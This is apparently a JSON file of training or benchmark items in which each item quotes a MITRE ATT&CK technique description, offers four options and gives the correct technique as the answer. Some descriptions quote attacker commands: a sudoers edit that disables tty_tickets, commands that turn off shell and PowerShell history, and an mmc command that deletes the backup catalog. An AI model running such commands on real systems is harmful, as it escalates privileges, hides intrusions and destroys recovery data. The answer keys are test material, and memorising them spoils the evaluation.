    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not Initial Access to that environment -- instead leveraging these devices to support additional targeting.\n\nOnce an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for Phishing campaigns (i.e., Link Target) or enabling the required access to execute Content Injection operations. Adversaries may also be able to harvest reusable credentials (i.e., Valid Accounts) from compromised network devices.\n\nAdversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.\n\nCompromised network devices may be used to support subsequent Command and Control activity, such as Hide Infrastructure through an established Proxy and/or Botnet network.\n\nA. Command and Scripting Interpreter, B. Modify Authentication Process: Domain Controller Authentication, C. Cloud Administration Command, D. Compromise Infrastructure: Network Devices\nAnswer:",
    "context": "",
    "output": "D. Compromise Infrastructure: Network Devices",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not Initial Access to that environment -- instead leveraging these devices to support additional targeting.\n\nOnce an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for Phishing campaigns (i.e., Link Target) or enabling the required access to execute Content Injection operations. Adversaries may also be able to harvest reusable credentials (i.e., Valid Accounts) from compromised network devices.\n\nAdversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.\n\nCompromised network devices may be used to support subsequent Command and Control activity, such as Hide Infrastructure through an established Proxy and/or Botnet network.",
      "options": "A. Command and Scripting Interpreter, B. Modify Authentication Process: Domain Controller Authentication, C. Cloud Administration Command, D. Compromise Infrastructure: Network Devices",
      "choice": "D. Compromise Infrastructure: Network Devices",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>. Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>. In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.\n\nPossible answers:\nA. Data Obfuscation: Protocol Impersonation, B. Abuse Elevation Control Mechanism: Sudo and Sudo Caching, C. Firmware Corruption, D. Remote Services",
    "context": "",
    "output": "B. Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>. Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>. In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
      "options": "A. Data Obfuscation: Protocol Impersonation, B. Abuse Elevation Control Mechanism: Sudo and Sudo Caching, C. Firmware Corruption, D. Remote Services",
      "choice": "B. Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages. \n\nPreauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials.  \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. \n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.\n\nOptions:\nA. Remote Service Session Hijacking, B. Domain or Tenant Policy Modification, C. Steal or Forge Kerberos Tickets: AS-REP Roasting, D. Search Closed Sources: Threat Intel Vendors",
    "context": "",
    "output": "C. Steal or Forge Kerberos Tickets: AS-REP Roasting",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages. \n\nPreauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials.  \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. \n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.",
      "options": "A. Remote Service Session Hijacking, B. Domain or Tenant Policy Modification, C. Steal or Forge Kerberos Tickets: AS-REP Roasting, D. Search Closed Sources: Threat Intel Vendors",
      "choice": "C. Steal or Forge Kerberos Tickets: AS-REP Roasting",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files.\nA. Account Discovery: Email Account, B. Account Discovery, C. Create or Modify System Process, D. File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
    "context": "",
    "output": "B. Account Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files.",
      "options": "A. Account Discovery: Email Account, B. Account Discovery, C. Create or Modify System Process, D. File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
      "choice": "B. Account Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., Shared Modules).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode). For example, the `Assembly.Load()` method executed by PowerShell may be abused to load raw code into the running process.\n\nReflective code injection is very similar to Process Injection except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.\n\nA. Boot or Logon Initialization Scripts: Network Logon Script, B. Modify Authentication Process, C. Reflective Code Loading, D. Data from Information Repositories: Sharepoint\nA:",
    "context": "",
    "output": "C. Reflective Code Loading",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., Shared Modules).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode). For example, the `Assembly.Load()` method executed by PowerShell may be abused to load raw code into the running process.\n\nReflective code injection is very similar to Process Injection except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.",
      "options": "A. Boot or Logon Initialization Scripts: Network Logon Script, B. Modify Authentication Process, C. Reflective Code Loading, D. Data from Information Repositories: Sharepoint",
      "choice": "C. Reflective Code Loading",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may \u201cpass the hash\u201d using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.\n\nA. Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth, B. Use Alternate Authentication Material: Pass the Hash, C. Modify Authentication Process: Password Filter DLL, D. Command and Scripting Interpreter: AutoHotKey & AutoIT\nAnswer:",
    "context": "",
    "output": "B. Use Alternate Authentication Material: Pass the Hash",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may \u201cpass the hash\u201d using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.",
      "options": "A. Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth, B. Use Alternate Authentication Material: Pass the Hash, C. Modify Authentication Process: Password Filter DLL, D. Command and Scripting Interpreter: AutoHotKey & AutoIT",
      "choice": "B. Use Alternate Authentication Material: Pass the Hash",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects. These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \n \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.\n\nA. Data from Removable Media, B. Compromise Infrastructure: Network Devices, C. Boot or Logon Initialization Scripts: Network Logon Script, D. Boot or Logon Initialization Scripts: RC Scripts\nAnswer:",
    "context": "",
    "output": "C. Boot or Logon Initialization Scripts: Network Logon Script",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects. These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \n \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
      "options": "A. Data from Removable Media, B. Compromise Infrastructure: Network Devices, C. Boot or Logon Initialization Scripts: Network Logon Script, D. Boot or Logon Initialization Scripts: RC Scripts",
      "choice": "C. Boot or Logon Initialization Scripts: Network Logon Script",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.\n\nFor example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode. Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object. Then, adversaries may create custom consoles with the \u201cLink to Web Address\u201d snap-in that is linked to the malicious CLSID subkey. Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.\nA. Server Software Component: SQL Stored Procedures, B. Hide Artifacts: Process Argument Spoofing, C. System Binary Proxy Execution: MMC, D. Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
    "context": "",
    "output": "C. System Binary Proxy Execution: MMC",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.\n\nFor example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode. Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object. Then, adversaries may create custom consoles with the \u201cLink to Web Address\u201d snap-in that is linked to the malicious CLSID subkey. Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.",
      "options": "A. Server Software Component: SQL Stored Procedures, B. Hide Artifacts: Process Argument Spoofing, C. System Binary Proxy Execution: MMC, D. Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
      "choice": "C. System Binary Proxy Execution: MMC",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.\n\nAdversaries may also leverage a Network Device CLI on network devices to disable historical command logging (e.g. <code>no logging</code>).\nA. Impair Defenses: Impair Command History Logging, B. System Binary Proxy Execution: MMC, C. Command and Scripting Interpreter: Network Device CLI, D. Data Obfuscation: Steganography",
    "context": "",
    "output": "A. Impair Defenses: Impair Command History Logging",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.\n\nAdversaries may also leverage a Network Device CLI on network devices to disable historical command logging (e.g. <code>no logging</code>).",
      "options": "A. Impair Defenses: Impair Command History Logging, B. System Binary Proxy Execution: MMC, C. Command and Scripting Interpreter: Network Device CLI, D. Data Obfuscation: Steganography",
      "choice": "A. Impair Defenses: Impair Command History Logging",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse the techniques. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.\n\nOptions:\nA. Phishing: Spearphishing via Service, B. Proxy: Internal Proxy, C. Non-Standard Port, D. Search Victim-Owned Websites",
    "context": "",
    "output": "C. Non-Standard Port",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse the techniques. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",
      "options": "A. Phishing: Spearphishing via Service, B. Proxy: Internal Proxy, C. Non-Standard Port, D. Search Victim-Owned Websites",
      "choice": "C. Non-Standard Port",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.\n\nOptions:\nA. System Binary Proxy Execution: Mavinject, B. Credentials from Password Stores: Cloud Secrets Management Stores, C. Process Injection: Thread Execution Hijacking, D. Serverless Execution",
    "context": "",
    "output": "C. Process Injection: Thread Execution Hijacking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
      "options": "A. System Binary Proxy Execution: Mavinject, B. Credentials from Password Stores: Cloud Secrets Management Stores, C. Process Injection: Thread Execution Hijacking, D. Serverless Execution",
      "choice": "C. Process Injection: Thread Execution Hijacking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server. Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello. When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. \n\nAdversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated Automated Exfiltration of emails, chat messages, and other data. Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.\n\nAccess to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.\n\nA. Exfiltration Over Web Service: Exfiltration Over Webhook, B. Gather Victim Host Information: Client Configurations, C. Obtain Capabilities: Digital Certificates, D. Scheduled Task/Job: Cron\nAnswer:",
    "context": "",
    "output": "A. Exfiltration Over Web Service: Exfiltration Over Webhook",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
